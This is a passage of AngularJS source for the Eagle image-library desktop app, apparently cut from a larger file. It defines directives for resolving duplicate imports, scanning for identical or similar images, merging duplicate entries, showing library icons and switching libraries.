                            img.palettes = newImage.palettes;
                            delete img.processingPalette;
                        }
                    }
                }
            });

            function loadFirst() {
                var hashID = getHashID($scope.duplicates[0]);
                var image = $scope.duplicates[0];
                $scope.left = $scope.mappings[hashID];
                $scope.right = image;
            };

            $scope.revealInUnfiled = (item) => {
                $bodyScope.openUnfiled();
                $timeout(function () {
                    $bodyScope.selected = [item];
                    $bodyScope.scrollToSelectedItem();
                }, 500);
            };

            $scope.onKeyup = function (event) {
                var keyCode = event.keyCode;
                if (keyCode === 27) {
                    if (event.metaKey || event.ctrlKey) {
                        $scope.cancelAll();
                    }
                    else {
                        $scope.cancel();
                    }
                }
                if (keyCode === 13) {
                    if (event.metaKey || event.ctrlKey) {
                        $scope.saveAll();
                    }
                    else {
                        $scope.save();
                    }
                }
            };

            // 取得继承炼的标签
            function getExtendTags(folder, tags) {
                try {
                    if (folder.tags) {
                        folder.tags.forEach(function (tag) {
                            tags.push(tag);
                        });
                    }
                    var parent = $scope.folderMappings[folder.parent];
                    if (parent && parent.tags && folder.parent) {
                        return getExtendTags(parent, tags);
                    }
                    else {
                        return tags.unique().reverse();
                    }
                }
                catch (err) {
                    electronLog && electronLog.error(err.stack || err);
                    return [];
                }
            }

            $scope.save = function () {

                if ($scope.applyAll == 'true') {
                    $scope.saveAll();
                }
                else {

                    // 如果勾选使用资源库版本
                    if ($scope.usingExist == 'true') {

                        // 将新导入对应的文件夹添加到既有文件上
                        try {
                            var newFileFolders = $scope.right.folders;
                            if (newFileFolders && newFileFolders.length > 0) {
                                newFileFolders.forEach(function (folderId) {
                                    var folder = $bodyScope.folderMappings[folderId];
                                    if (!folder) return;

                                    var idx = $scope.left.folders.indexOf(folderId);
                                    if (idx === -1) {
                                        $scope.left.folders.push(folderId);
                                        // 添加自动标签
                                        if (!$scope.left.tags) {
                                            $scope.left.tags = [];
                                        }
                                        var tags = getExtendTags(folder, []);
                                        tags.forEach(function (tag) {
                                            $scope.left.tags.push(tag);
                                        });
                                    }
                                });
                            }
                        } catch (err) { }

                        $scope.left.folders = [...new Set($scope.left.folders)];
                        $scope.left.tags = [...new Set($scope.left.tags)];

                        $scope.left.modificationTime = $scope.right.modificationTime;
                        ipcRenderer.send('images-change', [$scope.left]);
                        ipcRenderer.send('empty-trash', $scope.right.id);
                    }
                    else {
                        // 將圖片添加至內容列表
                        rootScope.addToDuplicateMapping($scope.right);
                        rootScope.raw.push($scope.right);
                    }
                    $scope.duplicates.splice(0, 1);
                    $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
                    $rootScope.$broadcast("REBIND_REFRESH", false);

                    ipcRenderer.send('palette-resume');

                    if ($scope.duplicates.length > 0) {
                        loadFirst();
                    }
                    else {
                        $scope.close();
                    }
                }
            };

            $scope.saveAll = function () {

                // 如果勾选使用资源库版本
                if ($scope.usingExist == 'true') {
                    // left: $scope.mappings[hashID]
                    var imageIdString = "";
                    $scope.duplicates.forEach(function (right) {
                        var hashID = getHashID(right);
                        var left = $scope.mappings[hashID];

                        try {
                            var newFileFolders = right.folders;
                            if (newFileFolders && newFileFolders.length > 0) {
                                newFileFolders.forEach(function (folderId) {
                                    var folder = $bodyScope.folderMappings[folderId];
                                    if (!folder) return;

                                    var idx = left.folders.indexOf(folderId);
                                    if (idx === -1) {
                                        left.folders.push(folderId);
                                        // 添加自动标签
                                        if (!left.tags) {
                                            left.tags = [];
                                        }
                                        var tags = getExtendTags(folder, []);
                                        tags.forEach(function (tag) {
                                            left.tags.push(tag);
                                        });
                                    }
                                });
                            }
                        } catch (err) { }

                        left.folders = [...new Set(left.folders)];
                        left.tags = [...new Set(left.tags)];
                        left.modificationTime = right.modificationTime;
                        ipcRenderer.send('images-change', [left]);
                        imageIdString += right.id + ",";
                    });
                    ipcRenderer.send('empty-trash', imageIdString);
                }
                else {
                    $scope.duplicates.forEach(function (image) {
                        rootScope.addToDuplicateMapping(image);
                        rootScope.raw.push(image);
                    });
                }

                $scope.duplicates = [];
                $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
                $rootScope.$broadcast("REBIND_REFRESH", false);
                ipcRenderer.send('palette-resume');
                $scope.close();
            };

            $scope.cancel = function () {

                if ($scope.applyAll == 'true') {
                    $scope.cancelAll();
                }
                else {
                    // 移除該圖片
                    var image = $scope.right;

                    ipcRenderer.send('empty-trash', image.id);
                    $scope.duplicates.splice(0, 1);
                    delete $scope.itemMappings[image.id];

                    if ($scope.duplicates.length > 0) {
                        loadFirst();
                    }
                    else {
                        if ($bodyScope.selectedMappings[image.id]) {
                            $bodyScope.selectedMappings = {};
                            $bodyScope.selected = [];
                            $bodyScope.updateSelection();
                        }
                        $scope.close();
                    }
                }
            };

            $scope.cancelAll = function () {
                var imageIdString = "";
                $scope.duplicates.forEach(function (r) {
                    imageIdString += r.id + ",";
                    delete $scope.itemMappings[r.id];
                });
                ipcRenderer.send('empty-trash', imageIdString);
                $scope.duplicates = [];
                $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
                $rootScope.$broadcast("REBIND_REFRESH", false);
                $rootScope.$broadcast("gl:reset", rootScope.allData);
                $scope.close();
            };

            $scope.close = function () {
                $timeout(function () {
                    $scope.left = undefined;
                    $scope.right = undefined;
                    $scope.duplicates = [];
                    $scope.applyAll == 'false'
                }, 500);
                $scope.isOpen = false;
                $("#duplicate-input").blur();
            };
        }
    }
});
EagleApp.directive('duplicateScanPanel', function($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/duplicate-scan-panel.html',
        scope: {
            theme: '=theme',
            folderMappings: '=folderMappings',
        },
        link: function ($scope, element, attrs, controllersArr) {

            $scope.init = (options) => {
                $scope.isOpen = false;
                $scope.items = [...options.items] || [];
                $scope.fingerprintMap = {};
                $scope.step = "INITIAL";
                $scope.reset();
            };

            $scope.reset = () => {
                $scope.scanMethod = undefined;
                $scope.similarity = 0.8;
                $scope.selectedItems = [];
                $scope.reducedSize = 0;
                $scope.total = $scope.items.length;
                $scope.current = 0;
                $scope.scanProgress = 0;

                $scope.groups = [];
                $scope.selectedGroupMap = {};
            };

            $scope.back = () => {
                if ($scope.cancelControl) {
                    $scope.cancelControl.cancel("user cancelled");
                }
                $scope.step = "INITIAL";
                $scope.reset();
            }

            $scope.goResult = () => {
                $scope.goToStep("SCAN-RESULT");
            };

            $scope.scanSame = () => {
                const tokenSource = require('cancellation');
                $scope.cancelControl = tokenSource();
                $scope.scanMethod = "SAME";
                $timeout(async () => {
                    $scope.goToStep("SCAN");
                    const result = await eagle.duplicateChecker.findDuplicateFiles($scope.items, $scope.cancelControl.token, {
                        onProgress: (curr, total) => {
                            const progress = Math.floor(curr / total * 100);
                            // console.log(`progress: ${progress}% curr: ${curr} total: ${total}`);
                            $scope.total = total;
                            $scope.current = curr;
                            $scope.scanProgress = progress;
                            $scope.$evalAsync();
                        }
                    });
                    console.log(result);

                    if (result.cancel) return;

                    $scope.groups = result.groups;
                    $scope.groups.forEach((group) => {
                        $scope.selectedGroupMap[group.id] = group;
                        group.choice = group.items[0];
                    });
                    $scope.subsetItems = [];
                    $scope.groups.forEach((group) => {
                        $scope.subsetItems = $scope.subsetItems.concat(group.items);
                    });
                    $scope.updateSelectedItems();
                    $scope.goToStep("SCAN-RESULT");
                    $scope.$evalAsync();
                }, 600);
            };

            $scope.scanSimilar = () => {
                const tokenSource = require('cancellation');
                $scope.cancelControl = tokenSource();
                $scope.scanMethod = "SIMILAR";
                $timeout(async () => {
                    $scope.goToStep("SCAN");
                    const startTime = Date.now();

                    const calcuteTimeLeft = (percent) => {
                        // 计算剩馀时间
                        var elapsedTime = Date.now() - startTime;
                        var chunksPerTime = percent / elapsedTime;
                        var estimatedTotalTime = 100 / chunksPerTime;
                        $scope.timeLeftInSeconds = parseInt((estimatedTotalTime - elapsedTime) / 1000);
                    };
                    
                    const result = await eagle.duplicateChecker.findSimilarFiles($scope.items, $scope.cancelControl.token, {
                        fingerprintMap: $scope.fingerprintMap,
                        fingerprintWeighted: $scope.similarity,
                        onProgress: throttle((curr, total) => {
                            const progress = Math.floor(curr / total * 100);
                            // console.log(`progress: ${progress}% curr: ${curr} total: ${total}`);
                            $scope.total = total;
                            $scope.current = curr;
                            $scope.scanProgress = progress;
                            calcuteTimeLeft(progress);
                            $scope.$evalAsync();
                        }, 16, true)
                    });

                    console.log(result);
                    if (result.cancel) return;
                    
                    $scope.fingerprintMap = result.fingerprintMap;
                    $scope.groups = result.groups;

                    $scope.subsetItems = [];
                    $scope.groups.forEach((group) => {
                        $scope.subsetItems = $scope.subsetItems.concat(group.items);
                    });

                    $scope.initSimilarGroups();
                    $scope.goToStep("SCAN-RESULT");
                    $scope.$evalAsync();
                }, 600);
            };

            $scope.changeSimilarityTimeout = undefined;
            $scope.changeSimilarity = (similarity) => {
                clearTimeout($scope.changeSimilarityTimeout);
                $scope.changeSimilarityTimeout = setTimeout(async () => {
                    $scope.similarity = similarity;
                    console.time("changeSimilarity");
                    const result = await eagle.duplicateChecker.findSimilarFiles($scope.subsetItems, $scope.cancelControl.token, {
                        fingerprintMap: $scope.fingerprintMap,
                        fingerprintWeighted: $scope.similarity,
                    });
                    console.timeEnd("changeSimilarity");
                    console.log(result);
                    $scope.selectedItems = [];
                    $scope.reducedSize = 0;
                    $scope.groups = result.groups;
                    $scope.selectedGroupMap = {};
                    $scope.initSimilarGroups();
                    $scope.$evalAsync();   
                }, 100);
            };

            $scope.initSimilarGroups = () => {
                // 根據 group item 的格式、分辨率、檔案大小進行排序
                // 優先使用最大分辨率的圖片
                // 第二使用格式最好的圖片，順序如下 PNG > BMP > JPG > JPEG > WEBP > AVIF
                // 第三使用檔案大小最大的圖片
                $scope.groups.forEach((group) => {
                    group.items.sort((a, b) => {
                        const aArea = a.width * a.height;
                        const bArea = b.width * b.height;
                        if (aArea > bArea) return -1;
                        if (aArea < bArea) return 1;
                        const aFormat = a.ext;
                        const bFormat = b.ext;
                        if (aFormat === bFormat) {
                            const aSize = a.size;
                            const bSize = b.size;
                            if (aSize > bSize) return -1;
                            if (aSize < bSize) return 1;
                        }
                        if (aFormat === "png") return -1;
                        if (bFormat === "png") return 1;
                        if (aFormat === "bmp") return -1;
                        if (bFormat === "bmp") return 1;
                        if (aFormat === "jpg") return -1;
                        if (bFormat === "jpg") return 1;
                        if (aFormat === "jpeg") return -1;
                        if (bFormat === "jpeg") return 1;
                        if (aFormat === "webp") return -1;
                        if (bFormat === "webp") return 1;
                        if (aFormat === "avif") return -1;
                        if (bFormat === "avif") return 1;
                    
                        return 0;
                    });

                    group.choice = group.items[0];
                });

                $scope.groups.forEach((group) => {
                    $scope.selectedGroupMap[group.id] = group;
                });
                
                $scope.updateSelectedItems();
            };

            $scope.startMerge = () => {
                $scope.goToStep("MERGE");
            };

            $scope.goToStep = (step) => {
                $scope.step = step;
            };

            $scope.scanSameFiles = () => {
                $scope.scanMethod = "SAME";
            };

            $scope.scanSimilarFiles = () => {
                $scope.scanMethod = "SIMILAR";
            };

            $scope.isGroupSelected = (group) => {
                return $scope.selectedGroupMap[group.id] ? true : false;
            };

            $scope.removeGroup = (group) => {
                const idx = $scope.groups.indexOf(group);
                if (idx > -1) {
                    $scope.groups.splice(idx, 1);
                }
                // remove form items
                $scope.subsetItems = $scope.subsetItems.filter((item) => {
                    return group.items.indexOf(item) === -1;
                });
                delete $scope.selectedGroupMap[group.id];
                $scope.updateSelectedItems();
            };

            $scope.toggleGroupSelection = (group) => {
                if ($scope.isGroupSelected(group)) {
                    delete $scope.selectedGroupMap[group.id];
                } else {
                    $scope.selectedGroupMap[group.id] = group;
                }
                $scope.updateSelectedItems();
            }

            $scope.selectChoice = (group, item) => {
                group.choice = item;
                $scope.updateSelectedItems();
            };

            $scope.openInNewWindow = (item) => {
                openInNewWindow([item]);
            };

            $scope.onItemMouseup = (event, item) => {
                if (event.which === 2) {
                    event.stopPropagation();
                    $scope.openInNewWindow(item);
                }
            };

            $scope.openItemContextMenu = (group, item) => {
                ContextMenu.open({
                    items: [
                        {
                            label: i18n.__('context.image.openInDefault'),
                            icon: 'ic-open-default.svg',
                            click: () => {
                                const rawPath = FileUrlHelper.getRawPath(item);
                                ipcRenderer.send('open-with-default', rawPath);
                            },
                        },
                        // 在新窗口打开
                        {
                            label: i18n.__('Context.Open.New.Window'),
                            icon: 'ic-open-new-window.svg',
                            click: () => {
                                $scope.openInNewWindow(item);
                            },
                        },
                        { 
                            label: i18n.__('duplicatePanel.step3.list.removeItem'), 
                            icon: 'ic-file-delete-permanently.svg',
                            click: () => { 
                                // remove item from group.items
                                const idx = group.items.indexOf(item);
                                if (idx > -1) {
                                    group.items.splice(idx, 1);
                                    group.choice = group.items[0];
                                }

                                // remove from items
                                const idx2 = $scope.subsetItems.indexOf(item);
                                if (idx2 > -1) {
                                    $scope.subsetItems.splice(idx2, 1);
                                }

                                // remove group if group.items is empty
                                if (group.items.length === 1) {
                                    $scope.removeGroup(group);
                                }
                                $scope.$evalAsync();
                            } 
                        },
                    ],
                    showSearch: false,
                });
            };

            $scope.updateSelectedItems = () => {
                $scope.reducedSize = 0;
                $scope.selectedItems = [];

                for (var key in $scope.selectedGroupMap) {
                    const group = $scope.selectedGroupMap[key];
                    const items = group.items;
                    $scope.selectedItems = $scope.selectedItems.concat(items);

                    if ($scope.scanMethod === "SAME") {
                        items.forEach((item, index) => {
                            if (items.length - 1 === index) return;
                            $scope.reducedSize += item.size;
                        });
                    }
                    else {
                        const choice = group.choice;
                        items.forEach((item, index) => {
                            if (item === choice) return;
                            $scope.reducedSize += item.size;
                        });
                    }
                }
            };

            $scope.getThumbnailUrl = (item) => {
                return FileUrlHelper.getThumbnailUrl(item);
            };

            $scope.onMerged = ({ changed, trash }) => {
                const totalSize = trash.reduce((acc, item) => {
                    return acc + item.size;
                }, 0);
                const size = $filter('filesize')(totalSize);
                const count= trash.length;

                const desc = $filter('i18n')("duplicatePanel.dialog.desc", [
                    { "property": "count", "value": count },
                    { "property": "size", "value": size }
                ]);

                swal({
                    html: `
                    <div class="alert">
                        <div class="alert-icon success"></div>
                        <h4 class="alert-title">${i18n.__('duplicatePanel.dialog.title')}</h4>
                        <p class="alert-desc">${desc}</p>
                    </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__('duplicatePanel.dialog.continue'),
                    cancelButtonText: i18n.__('duplicatePanel.dialog.exit'),
                }).then(() => {
                    $scope.groups = $scope.groups.filter((group) => {
                        return !$scope.selectedGroupMap[group.id];
                    });
                    $scope.selectedGroupMap = {};
                    $scope.selectedItems = [];
                    $scope.goResult();
                    $scope.$evalAsync();
                }, () => {
                    $scope.close();
                    $scope.$evalAsync();
                });
            }

            $scope.$on("OPEN_DUPLICATE_SCAN_PANEL", (event, params) => {
                $scope.init(params);
                $scope.isOpen = true;
            });

            $scope.close = function () {
                if ($scope.cancelControl) {
                    $scope.cancelControl.cancel("user cancelled");
                }
                $scope.isOpen = false;
            };
        }
    }
});
EagleApp.directive('mergeEditor', function($timeout, $rootScope, $filter) {
    return {
        replace: true,
        restrict: 'E',
        templateUrl: 'js/directives/merge-editor.html',
        scope: {
            theme: '=theme',
            groups: '=groups',
            selectedGroupMap: '=selectedGroupMap',
            method: '=method',
            onMerged: '=onMerged',
            folderMappings: '=folderMappings',
        },
        link: function ($scope, element, attrs, controllersArr) {

            init();

            function init () {
                $scope.isMerging = false;
                // 計算出選取的 groups
                $scope.selectedGroups = $scope.groups.filter((group) => $scope.selectedGroupMap[group.id]);
                $scope.currentGroup = $scope.selectedGroups[0];

                $scope.selectedItems = [];

                // 剛進入 merge 模式，初始化默認值
                $scope.selectedGroups.forEach((group) => {

                    // 計算每個 group 的 props
                    group.props = {
                        names: [],
                        urls: [],
                        folders: [],
                        tags: [],
                        annotations: [],
                        mergedAnnotation: ""
                    };
                    
                    group.items.forEach((item) => {
                        if (item.name) {
                            group.props.names.push(item.name);
                        }
                        if (item.url) {
                            group.props.urls.push(item.url);
                        }
                        if (item.folders && item.folders.length > 0) {
                            group.props.folders = group.props.folders.concat(item.folders);
                        }
                        if (item.tags && item.tags.length > 0) {
                            group.props.tags = group.props.tags.concat(item.tags);
                        }
                        if (item.annotation) {
                            group.props.annotations.push(item.annotation);
                        }

                        group.props.names = [...new Set(group.props.names)];
                        group.props.urls = [...new Set(group.props.urls)];
                        group.props.folders = [...new Set(group.props.folders)];
                        group.props.tags = [...new Set(group.props.tags)];
                        // sort tags
                        group.props.tags = group.props.tags.sort((a, b) => {
                            return a.localeCompare(b, 'zh-Hant-CN');
                        });
                        group.props.annotations = [...new Set(group.props.annotations)];

                        if (item.star && item.star > 0) {
                            if (group.props.star === undefined) {
                                group.props.star = item.star;
                            }
                            else if (group.props.star < item.star) {
                                group.props.star = item.star;
                            }
                        }

                        $scope.selectedItems.push(item);
                    });

                    group.mergedData = {
                        name: group.props.names[0],
                        thumbnailUrl: FileUrlHelper.getThumbnailUrl(group.items[0]),
                        url: group.props.urls[0] || "",
                        folders: [...group.props.folders],
                        foldersMap: {},
                        tags: [...group.props.tags],
                        tagsMap: {},
                        annotation: group.props.annotations[0] || "",
                        star: group.props.star ?? undefined,
                    };

                    group.mergedData.folders.forEach((folder) => {
                        group.mergedData.foldersMap[folder] = folder;
                    });

                    group.mergedData.tags.forEach((tag) => {
                        group.mergedData.tagsMap[tag] = tag;
                    });

                    // 如果 props annotation 超過 2 個以上，建立一個合併的 annotation
                    if (group.props.annotations.length > 1) {
                        group.mergedData.mergedAnnotation = group.props.annotations.join("\n").substring(0, 4096);
                    }
                });

                console.log($scope.selectedGroups);
            };

            $scope.getThumbnailUrl = (item) => {
                return FileUrlHelper.getThumbnailUrl(item);
            };
            
            $scope.selectGroup = (group) => {
                $scope.currentGroup = group;
            };

            $scope.changeName = (group, name) => {
                group.mergedData.name = name;
            };
            
            $scope.changeUrl = (group, url) => {
                group.mergedData.url = url;
            };

            
            $scope.selectCustomAnnotation = (group) => {
                group.customAnnotation = true;
                group.mergedData.annotation = group.props.mergedAnnotation;
            };
            
            $scope.changeAnnotation = (group, annotation) => {
                group.customAnnotation = false;
                group.mergedData.annotation = annotation;
            };
            
            $scope.toggleFolder = (group, folder) => {
                if (group.mergedData.folders.includes(folder)) {
                    group.mergedData.folders = group.mergedData.folders.filter((f) => f !== folder);
                    delete group.mergedData.foldersMap[folder];
                } else {
                    group.mergedData.folders.push(folder);
                    group.mergedData.foldersMap[folder] = folder;
                }
                group.mergedData.folders = [...new Set(group.mergedData.folders)];
            };
            
            $scope.toggleTag = (group, tag) => {
                if (group.mergedData.tags.includes(tag)) {
                    group.mergedData.tags = group.mergedData.tags.filter((t) => t !== tag);
                    delete group.mergedData.tagsMap[tag];
                } else {
                    group.mergedData.tags.push(tag);
                    group.mergedData.tagsMap[tag] = tag;
                }
                group.mergedData.tags = [...new Set(group.mergedData.tags)];
            };

            const checkOperationSafety = (callback, amount = 1) => {
                try {
                    if ($scope.selectedItems && $scope.selectedItems.length >= 1) {
                        var html = $filter('i18n')("Dialog.BulkAction.Descript", [
                            { "property": "count", "value": $scope.selectedItems.length },
                        ]);
                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__("Dialog.BulkAction.Title")}</h4>
                                    <p class="alert-desc">${html}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("Dialog.BulkAction.Button"),
                            cancelButtonText: i18n.__("general.cancel"),
                            allowEnterKey: false,
                        }).then(function (result) {
                            callback && callback();
                            $scope.$evalAsync();
                        });
                    }
                    else {
                        callback && callback();
                    }
                }
                catch (err) {
                    callback && callback();
                }
            };    

            $scope.merge = () => {
                checkOperationSafety(() => {
                    if ($scope.isMerging) return;
                    $scope.isMerging = true;

                    $scope.mergeProgress = 0;
                    
                    const changed = [];
                    const trash = [];
                    $scope.selectedGroups.forEach((group) => {
                        if (!group.choice?.id) return;
                        const choice = $bodyScope.itemMappings[group.choice.id];
                        const originName = choice.name;
                        const newName = group.mergedData.name;
                        choice.name = newName;
                        choice.oldName = originName;
                        choice.newName = newName;
                        choice.tags = group.mergedData.tags ?? choice.tags;
                        choice.folders = group.mergedData.folders ?? choice.folders;
                        choice.star = group.mergedData.star ?? choice.star;
                        
                        if (group.customAnnotation) {
                            choice.annotation = group.mergedData.mergedAnnotation ?? choice.annotation;
                        } else {
                            choice.annotation = group.mergedData.annotation ?? choice.annotation;
                        }
                        choice.url = group.mergedData.url ?? choice.url;

                        group.items.forEach((item) => {
                            const origin = $bodyScope.itemMappings[item.id];
                            if (!origin) return;
                            if (group.choice !== item) {
                                origin.isDeleted = true;
                                trash.push(origin);
                            }
                            changed.push(origin);
                        });
                    });

                    ayncsImagesChange(changed);
                    $bodyScope.calculateImageBinding({}, function() {
                        $bodyScope.notify({
                            message: $filter('i18n')("notify.removeDuplicate.successMsg"),
                            duration: 750
                        });
                        $bodyScope.rebindRefresh();
                        $bodyScope.updateSelection();
                        $scope.isMerging = false;
                        $scope.onMerged({
                            changed: changed,
                            trash: trash,
                        });
                        try { electronLog && electronLog.info(`[app] Clear all duplicate items, ${trash.length} files has been removed to trash`); } catch (err) {};
                    });
                }, 1)
            };
        }
    }
});
EagleApp.directive('libraryIcon', function($timeout, $rootScope) {
    return {
        restrict: 'A',
        link: function ($scope, element, attrs, controllersArr) {
            let libraryPath = attrs.libraryPath;
            $scope.$on("UPDATE_LIBRARY_ICON", function (event, path) {
                if (libraryPath === path) {
                    init();
                }
            });
            // watch attrs libraryPath change
            attrs.$observe('libraryPath', function (value) {
                libraryPath = value;
                init();
            });
            
            function init () {
                let iconPath = path.normalize(`${libraryPath}/icon.png`);
                let iconUrl = URL_MODULE.pathToFileURL(iconPath).href;
                $scope.iconUrl = iconUrl;
                fs.exists(libraryPath, function (isExists) {
                    let $item = $(`.check-item`).has(element);
                    if (!isExists) {
                        $item.addClass("missing");
                        element.html(`<img src="assets/images/base/icons/ic-library-missing-warning.svg" style="position: absolute; right: -2px; bottom: -2px;">`);
                        element.css("background-image", `url(assets/images/base/icons/ic-library-missing.svg)`);
                        return;
                    }
                    else {
                        $item.removeClass("missing");
                        element.html(``);
                    }
                    fs.exists(iconPath, function (isExists) {
                        if (isExists) {
                            element.css("background-image", `url('${iconUrl}?v=${Date.now()}')`);
                        }
                        else {
                            if (attrs.libraryIcon === "small") {
                                element.css("background-image", `url(assets/images/base/icons/ic-library-small.png)`);
                            }
                            else {
                                element.css("background-image", `url(assets/images/base/icons/ic-library-default.png)`);
                            }
                        }
                    });
                });
            }
            init();
        }
    }
});
EagleApp.directive('libraryPanel', function($timeout, $rootScope) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/library-panel.html',
        scope: {
            libraryHistory: '=libraryHistory',
            theme: '=theme'
        },
        link: function ($scope, element, attrs, controllersArr) {
            $scope.resultList = [];
            $scope.searchKeyword = "";
            $scope.currentIndex = -1;
            var $menu = $("#library-panel");
            var $searchInput = $("#library-panel-search");

            $scope.$on("UPDATE_LIBRARY_PANEL", function () {
                $scope.calculateList();
            });

            $scope.$on("OPEN_LIBRARY_PANEL", function (event, params) {

                $scope.currentIndex = -1;
                $scope.searchKeyword = "";

                $scope.pinnedLibrary = electronSettings.getSync('pinnedLibrary') || [];
                $scope.pinnedLibraryMap = {};
                $scope.pinnedLibrary.forEach(function (libraryPath) {
                    $scope.pinnedLibraryMap[libraryPath] = true;
                });
                $scope.listItems = [];
                $scope.libraryHistory.forEach(function (libraryHistory) {

                    var libraryName = path.basename(libraryHistory).replace('.library', '');
                    var libraryPath = path.normalize(libraryHistory);
					var libraryDirPath = path.normalize(path.dirname(libraryHistory).replace(/\\$/g, "").replace(/\/$/, ""));

                    $scope.listItems.push({
                        name: libraryName,
                        path: libraryPath,
						dir: libraryDirPath,
                        isOpened: $bodyScope.libraryPath === libraryPath
                    });
                })

                $scope.calculateList();

                $timeout(function () {
                    moveToCursorPosition($('#library-panel'));
                    $menu.addClass("open");
                    setTimeout(function () {
                        $scope.focusInput();
                    }, 100);
                }, 30);
            });

            $scope.hoverItem = function (index) {
                $scope.currentIndex = index;
            };

            $scope.scrollToTop = function () {
                $menu.find(".library-container").scrollTop(0);
            };

            $scope.calculateList = function () {
                if ($scope.searchKeyword !== "") {
                    $scope.resultList = filterLibraryItem($scope.listItems, $scope.searchKeyword);
                    if ($scope.resultList.length > 0) {
                        $scope.currentIndex = 0;
                    }
                }
                else {
                    $scope.resultList = $scope.listItems.unique();
                }
            }

            $scope.focusInput = function () {
                $searchInput.focus();
            };

            $scope.close = function () {
                $scope.scrollToTop();
                $menu.removeClass("open");
                $searchInput.blur();
                $scope.scrollToTop();
            };

            $scope.onItemClick = function (item) {
                if (item.isOpened) return;
                $bodyScope.openLibrary(item.path);
                $scope.close();
            };

            $scope.createLibrary = function () {
                $bodyScope.createLibrary();
                $scope.close();
            };

            $scope.loadLibrary = function () {
                $bodyScope.importLibrary();
                $scope.close();
            };

            $scope.reloadLibrary = function () {
                IPCHelper.send('reload-without-cache');
                $scope.close();
            };

            $scope.mergeLibrary = function () {
                $bodyScope.importLibraryData();
                $scope.close();
            };

            function filterLibraryItem (items, keyword) {

                if (!keyword) return items;
                var keyword_cn = chineseConvert.tw2cn(keyword);

                var temp = items.map(item => {
                    var nameCN = chineseConvert.tw2cn(item.name);
                    if (keyword.length >= 30 || item.name.length >= 30) {
                        return {
                            item: item,
                            name: nameCN,
                            search: [nameCN]
                        }
                    }
                    return {
                        item: item,
                        name: nameCN,
                        search: [nameCN, ..._.uniq(
                            cartesianProduct(pinyinlite(nameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                            .map(item => item.join(' '))
                        )],
                    };
                });

                var scores = temp.map(item => {
                    return {
                        item: item,
                        name: item.name,
                        score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
                    };
                })
                
                var result = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
                    return i.item.item;
                });

                return result;
            }

            function selectCurrent () {
                if ($scope.resultList[$scope.currentIndex]) {
                    $scope.onItemClick($scope.resultList[$scope.currentIndex]);
                    $scope.$evalAsync();
                }
            };

            function selectPrev () {
                if ($scope.currentIndex > 0) {
                    $scope.currentIndex--;
                    $scope.$evalAsync();
                }
            };

            function selectNext () {
                if ($scope.currentIndex < $scope.resultList.length - 1) {
                    $scope.currentIndex++;
                    $scope.$evalAsync();
                }
            };

            function updatePinnedLibrary () {
                if ($scope.pinnedLibrary) {
                    $scope.pinnedLibrary = $scope.pinnedLibrary.sort(function (a, b) {
                        try {
                            var idxa = $scope.libraryHistory.indexOf(a);
                            var idxb = $scope.libraryHistory.indexOf(b);
                            if(idxa > idxb) return 1;
                            if(idxa < idxb) return -1;
                        } catch (err) {}
                        return 0;
                    });
                    electronSettings.setSync('pinnedLibrary', $scope.pinnedLibrary);
                }
                $rootScope.$broadcast("UPDATE_MAIN_NAV");
            }

            function updateLibraryHistory () {
                var libraryHistory = $scope.listItems.map(function (item) {
                    return item.path;
                });
                if (libraryHistory.length > 0) {
                    electronSettings.setSync('libraryHistory', libraryHistory);
                }
                $scope.libraryHistory = libraryHistory;
                IPCHelper.send('update-preferences');
            }

            $scope.openSubmenu = function ($event, item) {
                
                $event && $event.stopPropagation();
                let iconPath = path.normalize(`${item.path}/icon.png`);

                ContextMenu.open({
                    items: [
                        {
                            label: i18n.__("dialog.libraryItem.changeIcon"),
                            icon: 'ic-icon-change.svg',
                            click: () => {
                                dialog.showOpenDialog(currentWindow, {
                                    title: "Select files",
                                    filters: [
                                        { name: 'Image', extensions: ['jpg', 'png', 'jpeg', 'webp', 'gif'] },
                                    ],
                                    properties: ['openFile']
                                }).then(result => {
                                    var paths = result.filePaths;
                                    if (!paths || paths.length === 0) return;
                                    var choosePath = paths[0];
                                    try {
                                        let iconUrl = URL_MODULE.pathToFileURL(iconPath).href;
                                        let image = new Image();
                                        image.onload = function() {
                                            try {
                                                canvasHelper.resize(image, {
                                                    toCropImgX: 0,
                                                    toCropImgY: 0,
                                                    toCropImgW: image.width,
                                                    toCropImgH: image.height,
                                                    imgChangeRatio: 64 / Math.min(image.width, image.height),
                                                    mimeType: "image/png",
                                                    quality: 100
                                                }, function (base64string) {
                                                    let buffer = decodeBase64Image(base64string).data;
                                                    if (fs.existsSync(iconPath)) {
                                                        fse.removeSync(iconPath);
                                                    }
                                                    fs.writeFile(iconPath, buffer, function (err) {
                                                        $rootScope.$broadcast("UPDATE_LIBRARY_ICON", item.path);
                                                        $scope.$evalAsync();
                                                    });
                                                });
                                            }
                                            catch (err) {
                                                finishCallback(null);
                                            }
                                        };
                                        image.onerror = function() {};
                                        image.src = URL_MODULE.pathToFileURL(choosePath).href;
                                    } catch (err) {
                                        electronLog && electronLog.error(err.stack || err);
                                    }
                                });
                            }
                        },
                        {
                            label: i18n.__("dialog.libraryItem.removeIcon"),
                            icon: 'ic-icon-remove.svg',
                            click: () => {
                                var confContextMenu = new Menu();
                                confContextMenu.append(new MenuItem({ 
                                    label: i18n.__("dialog.libraryItem.remove"),
                                    click: function() { 
                                        if (fs.existsSync(iconPath)) {
                                            fs.unlink(iconPath, function () {
                                                $rootScope.$broadcast("UPDATE_LIBRARY_ICON", item.path);
                                                $scope.$evalAsync();
                                            });
                                        }
                                    }
                                }));
                                confContextMenu.append(new MenuItem({ 
                                    label: i18n.__("general.cancel"),
                                    click: function() {}
                                }));
